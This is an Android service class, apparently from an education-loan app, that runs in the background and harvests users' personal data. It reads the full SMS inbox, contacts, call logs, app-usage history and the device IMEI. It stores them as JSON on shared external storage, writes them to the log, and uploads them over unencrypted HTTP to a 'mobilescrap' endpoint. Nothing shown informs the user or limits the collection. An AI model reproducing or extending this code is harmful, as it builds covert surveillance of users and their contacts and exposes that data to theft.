package com.eduvanzapplication;

import android.annotation.TargetApi;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.eduvanzapplication.newUI.MainApplication;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import static com.eduvanzapplication.newUI.MainApplication.TAG;

/**
 * Created by Vijay on 19/9/17.
 */

public class MyService extends Service {

    Context context;
    static String stringAllSmsContacts;
    public static String latestSmsDate = "";
    public static String userID = "", userMobileNo = "", userLoggedinID = "";
    private LongOperation longOperation = null, longOperation2 = null, longOperation3 = null, longOperation4 = null;
    public static String mobileNo = "", userid = "", data = "", page = "", userName = "", imeiNo = "", simImei = "", ipaddress = "";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        Log.e(MainApplication.TAG, "Service onCreate");
        context = this;

        Log.e(MainApplication.TAG, "Alarm received!: ");
        Log.e(TAG, "MyService  : 11111111111111111111111111");
        /** getting data from shared preference **/
        SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
        userLoggedinID = sharedPreferences.getString("logged_id", "null");
        userMobileNo = sharedPreferences.getString("mobile_no", "null");
        userID = sharedPreferences.getString("logged_id", "null");

        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        imeiNo = telephonyManager.getDeviceId();
        ipaddress = Utils.getIPAddress(true);
        Log.e(MainApplication.TAG, "PHONE DATA " + "IMEINO:=" + imeiNo + "ipaddress:" + ipaddress +" USER ID :"+ userID);

    }

    /**
     * Read SMS
     **/
    public static void readSms(Context context, String userNo, String studentID) {
        Log.e(MainApplication.TAG, " readSms:" );
        Context c = context;
        SmsPojo objSms;
        String message = "";
        JSONObject outerOb = new JSONObject();

        final String SMS_URI_INBOX = "content://sms/inbox";
        final String SMS_URI_ALL = "content://sms/";
        try {
            Uri uri = Uri.parse(SMS_URI_INBOX);
            // data which we need to show
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
//            Cursor cur = getContentResolver().query(uri, projection, null, null, null);
//            Cursor cur = getContentResolver().query(uri,projection, "address = '+919967391077'",null,null);
            Cursor cur = context.getContentResolver().query(uri, projection, null, null, null);
            //count the number of result we get
            int total = cur.getCount();
//            Log.e("MediaContent", "ReadSms :query" + cur.toString() + "\n" + total);
            JSONArray json = new JSONArray();
            int d = 0;
            // showProressBar("Reading sms. Please wait...");
            if (cur.moveToFirst()) {
                for (int i = 0; i < total; i++) {
                    double final1 = ((double) i / total) * 100;
//                    Log.e(MainApplication.TAG, "readSms:progress "+final1+i);
                    int rounded = (int) Math.round(final1);
//                    if(rounded==99){
//                        rounded=100;
//                        mDialog.setProgress(rounded);
//                    }else {
//                        mDialog.setProgress(rounded);
//                    }

//                    Log.e("Readsms", "readSms: "+total );
                    objSms = new SmsPojo();
//                    String contactId = cur.getString(cur.getColumnIndex(
//                            ContactsContract.Contacts._ID));
//                    String hasPhone = cur.getString(cur.getColumnIndex(
//                            ContactsContract.Contacts.HAS_PHONE_NUMBER));
//                    Log.e(TAG, "readSms: "+contactId+"\n"+hasPhone );

                    String id = cur.getString(cur.getColumnIndexOrThrow("_id"));
                    String peron = cur.getString(cur.getColumnIndexOrThrow("person"));
                    objSms.set_address(cur.getString(cur.getColumnIndexOrThrow("address")));
                    objSms.set_msg(cur.getString(cur.getColumnIndexOrThrow("body")));
                    objSms.set_time(cur.getString(cur.getColumnIndexOrThrow("date")));
                    String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                    String type = cur.getString(cur.getColumnIndexOrThrow("type"));
//                    Log.e("Readsms", "" + objSms.get_address() + "\n" + objSms.get_msg()+
//                            "\n person"+peron+"\n type"+type+"\n ID"+id+"\n Date"+date);
                    cur.moveToNext();


//                    /** INSERT DATE INTO SQL DATABASE **/
//                    if (d == 0) {
//                        d++;
//                        DBHandler dbHandler = new DBHandler(c);
//                        dbHandler.addDate(date, "1");
//                        latestSmsDate = date;
//                    }

                    // create new object
//                    listPojo= new ListPojo();
//                    //add data to this object
//                    listPojo.address=objSms.get_address();
//                    listPojo.message=objSms.get_msg();
//                    listPojo.type=objSms.get_time();
//                    //create ListArray
//                    mList.add(listPojo);
                    JSONObject mObject = new JSONObject();
                    mObject.accumulate("from", objSms.get_address());
                    mObject.accumulate("message", objSms.get_msg());
                    mObject.accumulate("time", objSms.get_time());
                    mObject.accumulate("type", type);
                    mObject.accumulate("sms_id", id);

//                    if (!latestSmsDate.equalsIgnoreCase("")) {
//                        long a = Long.parseLong(latestSmsDate) - Long.parseLong(date);
//                        if (a < 0) {
                            json.put(mObject);
//                        }
//                    } else {
//                        json.put(mObject);
//                    }
                }
                outerOb.accumulate("student_id", studentID);
                outerOb.accumulate("student_mobile_no", userNo);
                outerOb.accumulate("created_by_ip", ipaddress);
                outerOb.accumulate("sim_serial_no", simImei);
                outerOb.accumulate("imei", imeiNo);
                outerOb.put("Sms_info", json);
                message = outerOb.toString();
                Log.e("", "readSms: "+message );

            }
            mCreateAndSaveFile("saveSMS.json", message);


        } catch (SQLiteException ex)

        {
            Log.d("SQLiteException", ex.getMessage());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    /** END of Read SMS **/


    /**
     * CONTACTS READ
     **/
    public static void contactsRead(Context c) throws JSONException {
        Log.e(MainApplication.TAG, " contactsRead: 3333333333333333333333333333" );
        Context context = c;
        JSONArray jsonArray = new JSONArray();
        String phoneNo = "";
        String name = "";
        String contacts="";
        JSONObject outerOb = new JSONObject();

        ContentResolver cr = c.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        try {

            if (cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts._ID));
                    name = cur.getString(cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME));

                    if (cur.getInt(cur.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            phoneNo = pCur.getString(pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
//                            Log.e(TAG, "CONTACTS: ");
                        }
                        pCur.close();
                    }

                    JSONObject mObject = new JSONObject();
                    mObject.accumulate("contact_name", name);
                    mObject.accumulate("contact_mobile_no", phoneNo);

                    jsonArray.put(mObject);

                }
                outerOb.accumulate("student_id", userID);
                outerOb.accumulate("student_mobile_no", userMobileNo);
                outerOb.accumulate("created_by_ip", ipaddress);
                outerOb.accumulate("sim_serial_no", simImei);
                outerOb.accumulate("imei", imeiNo);
                outerOb.put("contacts_info", jsonArray);
                contacts = outerOb.toString();

                Log.e(TAG, "contacts: " + contacts);
            }
            mCreateAndSaveFile("saveContacts.json", contacts);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /** END OF CONTACTS READ **/


    /**
     * CALL LOGS READ
     **/

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public static void callLogs(Context context) {
        Log.e(MainApplication.TAG, " callLogs: 444444444444444444444444444444444" );

        String phNumber="", callType="", callDuration="", logs="";
        JSONArray jsonArray = new JSONArray();
        JSONObject outerOb = new JSONObject();


        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");

        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

        while (cursor.moveToNext()) {
            phNumber = cursor.getString(number);
            callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            callDuration = cursor.getString(duration);
            String dir = null;

            JSONObject mObject = new JSONObject();
            try {
                mObject.accumulate("callee_number", phNumber);
                mObject.accumulate("call_type", callType);
                mObject.accumulate("call_duration", callDuration);
                mObject.accumulate("call_date", callDayTime);
                jsonArray.put(mObject);

            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        cursor.close();
        try {
            outerOb.accumulate("student_id", userID);
            outerOb.accumulate("student_mobile_no", userMobileNo);
            outerOb.accumulate("created_by_ip", ipaddress);
            outerOb.accumulate("sim_serial_no", simImei);
            outerOb.accumulate("imei", imeiNo);
            outerOb.put("call_logs", jsonArray);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        logs = outerOb.toString();
        mCreateAndSaveFile("saveCallLogs.json", logs);

    }

    /**
     * APP STATS READ
     **/

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public  static void appStats(Context context){
        Log.e(MainApplication.TAG, " appStats: 555555555555555555555555555555555" );
        JSONArray jsonArray = new JSONArray();
        String appUseage="";
        JSONObject outerOb = new JSONObject();
        Log.e(MainApplication.TAG, " appStats: 555555555555555555555555555555555  SIZE" + getUsageStatsList(context).size());
        for(int i=0; i<getUsageStatsList(context).size();i++) {
            JSONObject mObject = new JSONObject();
            if(getUsageStatsList(context).get(i).getTotalTimeInForeground()>0) {
                try {
                    mObject.accumulate("app_name", getUsageStatsList(context).get(i).getPackageName());
                    mObject.accumulate("appusage_time", getUsageStatsList(context).get(i).getTotalTimeInForeground());
                    jsonArray.put(mObject);

                } catch (JSONException e) {
                    e.printStackTrace();
                }


            }
        }

        try {
            outerOb.accumulate("student_id", userID);
            outerOb.accumulate("student_mobile_no", userMobileNo);
            outerOb.accumulate("created_by_ip", ipaddress);
            outerOb.accumulate("sim_serial_no", simImei);
            outerOb.accumulate("imei", imeiNo);
            outerOb.put("app_stats", jsonArray);

            appUseage = outerOb.toString();
            mCreateAndSaveFile("saveAppStats.json", appUseage);

        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    public static void mCreateAndSaveFile(String params, String mJsonResponse) {
        Log.e(MainApplication.TAG, " mCreateAndSaveFile:" );
        try {
            String path = "/storage/sdcard0/" + params;
            final File dir = new File(Environment.getExternalStorageDirectory() + "/");
            if (dir.exists() == false) {
                dir.mkdirs();
            }
            File f = new File(dir, params);
            f.getAbsolutePath();
            FileWriter file = new FileWriter(f.getAbsolutePath());
            file.write(mJsonResponse);
            file.flush();
            file.close();

            mReadJsonData(params);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public static List<UsageStats> getUsageStatsList(Context context){
        UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        Calendar calendar = Calendar.getInstance();
        long endTime = calendar.getTimeInMillis();
        calendar.add(Calendar.YEAR, -1);
        long startTime = calendar.getTimeInMillis();
        List<UsageStats> usageStatsList = usm.queryUsageStats(UsageStatsManager.INTERVAL_YEARLY,startTime,endTime);
        return usageStatsList;
    }

    public static void mReadJsonData(final String filename) {
        Log.e(TAG, "mReadJsonData: " );
        final File dir = new File(Environment.getExternalStorageDirectory()+"/");
        if (dir.exists() == false) {
            dir.mkdirs();
        }
        final File f = new File(dir, filename);
        new Thread(new Runnable() {
            @Override
            public void run() {
                uploadFile(f.getAbsolutePath(), filename);
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Log.e(MainApplication.TAG, "Service onStartCommand");

        selectOperations();

        //start sticky means service will be explicity started and stopped
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {

    }

    private void selectOperations()
    {
        Log.e(TAG, "selectOperations: " );

        longOperation = new LongOperation();
        longOperation.execute("sms");

        longOperation2 = new LongOperation();
        longOperation2.execute("contacts");

        longOperation3 = new LongOperation();
        longOperation3.execute("calllogs");

        longOperation4 = new LongOperation();
        longOperation4.execute("appstats");
    }


    /** ---------------- ASYNC TASK --------------**/
    private class LongOperation extends AsyncTask<String, Void, Void> {

        @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
        @Override
        protected Void doInBackground(String... params) {
            Log.e(TAG, "doInBackground: " );
            String operationName = params[0];

            switch (operationName){

                case "sms":
                    readSms(context, userMobileNo, userID);
                    break;
                case  "contacts":
                    try {
                        contactsRead(context);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    break;
                case  "calllogs":
                    callLogs(context);
                    break;
                case  "appstats":
                    appStats(context);
                    break;
            }

            return null;
        }

        @Override
        protected void onPreExecute() {}

        @Override
        protected void onProgressUpdate(Void... values) {}
    }


    /** upload SMS file to server **/
    public static int uploadFile(final String selectedFilePath, String fileType) {
        String a=fileType;
//        String[]  scrapingfileName = a.split(".");
       a= a.substring(0, a.lastIndexOf('.'));

        StringBuffer sb;
        long total = 0;
//        String urlup = "http://139.59.32.234/sms/Api/send_message";
        String urlup = "http://api.eduvanz.com/mobilescrap/send_message";
        int serverResponseCode = 0;

        Log.e(TAG, "uploadFile: 999999999999999999999999999999" );
        Log.e(TAG, "uploadFile:"+"  file name : "+ a );

        HttpURLConnection connection;
        DataOutputStream dataOutputStream;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        final int count,fileLength;

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
        File selectedFile = new File(selectedFilePath);

        Log.e(TAG, "uploadFile: "+selectedFilePath );
        String[] parts = selectedFilePath.split("/");
        final String fileName = parts[parts.length - 1];

        if (!selectedFile.isFile()) {
            //dialog.dismiss();

//            runOnUiThread(new Runnable() {
//                @Override
//                public void run() {
            Log.e("ReadSms", "run: " + "Source File Doesn't Exist: " + selectedFilePath);
//                }
//            });
            return 0;
        }
        else {
            try {
//                runOnUiThread(new Runnable() {
//                    @Override
//                    public void run() {
//                        showProressBar("Please wait verifying user credentials");
//                    }
//
//                });


                FileInputStream fileInputStream = new FileInputStream(selectedFile);
                URL url = new URL(urlup);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoInput(true);//Allow Inputs
                connection.setDoOutput(true);//Allow Outputs
                connection.setUseCaches(false);//Don't use a cached Copy
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Connection", "Keep-Alive");
                connection.setRequestProperty("ENCTYPE", "multipart/form-data");
                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                connection.setRequestProperty(a, selectedFilePath);
//                connection.setRequestProperty("file_name", "saveSMS");
                Log.e("ReadSms", "Server property" + connection.getRequestMethod() + ":property " + connection.getRequestProperties());


                //creating new dataoutputstream
                dataOutputStream = new DataOutputStream(connection.getOutputStream());

                //writing bytes to data outputstream
                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\""+a+"\";filename=\""
//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"saveCallLogs\";filename=\""
                        + selectedFilePath + "\"" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);

                //returns no. of bytes present in fileInputStream
                bytesAvailable = fileInputStream.available();
                //selecting the buffer size as minimum of available bytes or 1 MB
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                //setting the buffer as byte array of size of bufferSize
                buffer = new byte[bufferSize];
                fileLength=bufferSize;
                //reads bytes from FileInputStream(from 0th index of buffer to buffersize)
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                Log.e(TAG, "uploadFile: TOTAL bytes to read "+bytesRead+"total"+bufferSize );
                //loop repeats till bytesRead = -1, i.e., no bytes are left to read
                total=0;

                while (bytesRead > 0) {
                    total+=bytesRead;
                    //write the bytes read from inputstream
                    dataOutputStream.write(buffer, 0, bufferSize);
                    Log.e("ReadSms", " here: \n\n" + buffer + "\n" + bufferSize);
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                    Log.e(TAG, "uploadFile: "+bytesRead+total );
                    Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
                    // Publish the progress
                    final int finalBytesRead = bytesRead;
//                    runOnUiThread(new Runnable() {
//                        @Override
//                        public void run() {

                    Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
//                            mDialog.setProgress((int) Math.round(total * 100 / fileLength));
//                        }
//                    });
                }
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"file_name\"" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes("1");
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
//                taOutputStream.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\""
//                        + selectedFilePath + "\"" + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"studentId\";studentId=" + userID + "" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(userID);
                dataOutputStream.writeBytes(lineEnd);

                //dataOutputStream.writeBytes(URLEncoder.encode("user_id", "UTF-8")
                //        + "=" + URLEncoder.encode("1", "UTF-8"));

                serverResponseCode = connection.getResponseCode();
                Log.e("ReadSms", " here:server response \n\n" + serverResponseCode);
                String serverResponseMessage = connection.getResponseMessage();
                Log.e("ReadSms", " here: server message \n\n" + serverResponseMessage.toString() + "\n" + bufferSize);
                BufferedReader br = new BufferedReader(new InputStreamReader((connection.getInputStream())));
                String output = "";
                sb = new StringBuffer();

                while ((output = br.readLine()) != null) {
                    sb.append(output);
                    Log.e("ReadSms", "uploadFile: " + br);
                    Log.e("ReadSms", "Server Response is: " + serverResponseMessage + ": " + serverResponseCode);
                }
                Log.e("ReadSms ", "uploadFile: " + sb.toString());

                //response code of 200 indicates the server status OK
                if (serverResponseCode == 200) {
//                    runOnUiThread(new Runnable() {
//                        @Override
//                        public void run() {
//                            Toast.makeText(context, sb.toString(), Toast.LENGTH_SHORT).show();
                    Log.e(TAG, "uploadFile: "+sb.toString() );

                    Log.e("ReadSms", " here: \n\n" + fileName);
//                        }
//                    });
                }

                //closing the input and output streams
                fileInputStream.close();
                dataOutputStream.flush();
                dataOutputStream.close();


            } catch (FileNotFoundException e) {
                e.printStackTrace();
//                runOnUiThread(new Runnable() {
//                    @Override
//                    public void run() {
//                        Toast.makeText(context, "File Not Found", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "uploadFile: "+"File Not Found" );
//                    }
//                });
            } catch (MalformedURLException e) {
                e.printStackTrace();
//                Toast.makeText(context, "URL error!", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "uploadFile: "+"URL error!" );

            } catch (IOException e) {
                e.printStackTrace();
//                Toast.makeText(context, "Cannot Read/Write File!", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "uploadFile: "+"Cannot Read/Write File!" );
            }
//            dialog.dismiss();
            return serverResponseCode;
        }
    }

}
